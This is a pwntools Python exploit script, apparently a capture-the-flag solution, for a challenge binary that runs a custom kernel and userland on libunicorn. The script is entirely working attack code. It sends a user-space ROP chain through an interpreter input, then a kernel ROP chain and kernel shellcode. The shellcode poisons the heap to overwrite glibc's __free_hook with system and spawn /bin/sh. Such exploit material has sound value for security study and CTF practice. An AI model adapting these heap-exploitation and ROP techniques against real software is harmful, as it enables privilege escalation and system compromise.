#!/usr/bin/env python3

from pwn import *

exe = ELF("main", checksec=0)
libu = ELF("libunicorn.so.1", checksec=0)
libc2 = ELF("libc.so.6", checksec=0)

context.binary = exe


def conn():
    return process([exe.path, "./kernel", "./userland"], env={"LD_PRELOAD":libu.path})

def bf_payload(data):
    result = b""
    for i in data:
        result += bytes([i]) + b"\x01"
    return result

def set(syscall, rdi, rsi, rdx, sys=1):
    payload = b""
    payload += p64(0x0000000000400121) # pop rax ; ret
    payload += p64(rdi)
    payload += p64(0x00000000004009d3) # mov rdi, rax ; jmp 0x400ca0
    payload += p64(0x0000000000400af5) # pop r12 ; pop r13 ; ret
    payload += p64(rdx)
    payload += p64(0x00000000004008f4) # pop rbx; ret
    payload += p64(0x00000000004008f4) # pop rbx; ret
    payload += p64(rsi)
    payload += p64(0x00000000004008bd) # mov rdx, r12 ; mov rsi, rbx ; call r13
    payload += p64(0x0000000000400121) # pop rax ; ret
    payload += p64(syscall)
    if sys:
        payload += p64(0x0000000000400cf2) # syscall ret
    
    return payload

def main():
    r = conn()

    # Addresses
    shared_memory = 0x7fffffeff000
    read_gadget = 0xffffffff8100008c
    interrupt_0x70 = 0xffffffff810001db
    chunk = 0x1a061e0
    main = 0x04005f1
    
    bf =  b"+[>,]"
    bf += b">"*(0x12)
    bf += b"+[,>,]"
    bf += b"!"
    
    read  = set(0, 0, shared_memory, 0x49)
    open_ = set(2, shared_memory, 0, 0)

    bf  += b"M"*4101 + p8(0)
    bf  += bf_payload(read + open_)
    bf  += p8(0)*2
 
    pause()
    r.sendafter(": ", bf)
    
    filename = b"m"*0x48 + p8(0x8c)
    r.send(filename)
    # The last KSOF

    kshellcode = asm(f"""
            #define malloc(size)\
                    xor rax, rax;\
                    mov rdi, size;\
                    int 0x71;

            #define free()\
                    mov rax, 3;\
                    int 0x71;

            #define write(addr, size)\
                    mov rax, 1;\
                    mov rdi, addr;\
                    mov rsi, size;\
                    int 0x71;

            #define read(addr, size)\
                    mov rax, 2;\
                    mov rdi, addr;\
                    mov rsi, size;\
                    int 0x71

            malloc(0x60)
            free()
            read({shared_memory}, 0xb0)
            mov r14, {shared_memory+0xa8}
            mov r11, [r14]
            sub r11, 0x1b406                    ;//r11 contain the base address of libunicorn.
            add r11, 0x2ff040                   ;//r11 now contain a pointer to glibc.
            mov r13, {shared_memory}
            mov [r13], r11

            malloc(0x30)
            free()
            write(r13, 0x10)
            malloc(0x30)
            malloc(0x30)
            read(r13, 0x8)
            mov r14, [r13]                     
            sub r14, 0xb6950                    ;// r14 is the GlibC base address now.
            mov r11, r14
            add r11, 0x3ed8e8                   ;// r11 the address of __free_hook.
            mov r12, r14
            add r12, 0x4f550                    ;// r12 is system.

            malloc(0x50)
            free()
            push r11
            write(rsp, 0x8)
            malloc(0x50)
            malloc(0x50)
            push r12
            write(rsp, 0x8)

            malloc(0x20)
            mov r15, 0x68732f6e69622f
            push r15
            write(rsp, 0x8)
            free()                      ;// system("/bin/sh")

    """) + b"MAHER" 
    
    krop = b"M"*0x50
    krop += set(9, 0x1000, 0x1000, 0x7, 0)
    krop += p64(interrupt_0x70)
    krop += set(0, 0x1000, len(kshellcode), 0x10, 0)
    krop += p64(read_gadget)
    krop += p64(0x1000)

    krop = krop.ljust(0x38F, p8(0))
    print("Length KROP : ", len(krop))
    r.send(krop)
    r.send(kshellcode)
    print("Offset to the chunk : ", hex(chunk))
    
    r.interactive()


if __name__ == "__main__":
    main()

